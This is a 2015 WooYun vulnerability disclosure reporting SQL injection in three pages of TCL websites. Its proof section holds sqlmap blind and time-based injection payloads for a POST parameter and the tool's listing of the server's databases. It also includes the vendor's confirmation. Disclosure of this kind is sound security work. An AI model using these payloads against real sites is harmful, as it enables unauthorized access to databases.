wybug_title: TCL某站存在SQL注入#三处打包
wybug_detail:
漏洞详情 披露状态：   									2015-08-30：	细节已通知厂商并且等待厂商处理中									2015-08-31：	厂商已经确认，细节仅向厂商公开									2015-09-10：	细节向核心白帽子及相关领域专家公开									2015-09-20：	细节向普通白帽子公开									2015-09-30：	细节向实习白帽子公开									2015-10-15：	细节向公众公开  简要描述： TCL某站存在SQL注入#三处打包 详细说明：  第一处：http://www.tclcomm.com//manual.asp?typeid=1第二处：http://www.tclcomm.cn/product_detail.asp?Pid=1032第三处：http://www.tclcomm.com/product/productsearch.asp POST下参数keys存在注入   漏洞证明：  测试其中一处
Place: POSTParameter: keys    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keys=%' AND 8775=8775 AND '%'='    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: keys=-6535%' OR 3786=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND '%'='---[11:51:06] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[11:51:06] [INFO] fetching database names[11:51:06] [INFO] fetching number of databases[11:51:06] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:51:06] [INFO] retrieved: 7[11:51:10] [INFO] retrieved: master[11:51:37] [INFO] retrieved: model[11:52:00] [INFO] retrieved: msdb[11:52:20] [INFO] retrieved: ReportServer[11:53:13] [INFO] retrieved: ReportServerTempDB[11:54:29] [INFO] retrieved: tempdb[11:54:56] [INFO] retrieved: webavailable databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] web
   修复方案：  RT   版权声明：转载请注明来源 Nday Plus@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-08-31 10:25 厂商回复： 漏洞已经反馈给系统管理员进行修复，感谢您对TCL 的关注，谢谢！ 最新状态： 暂无
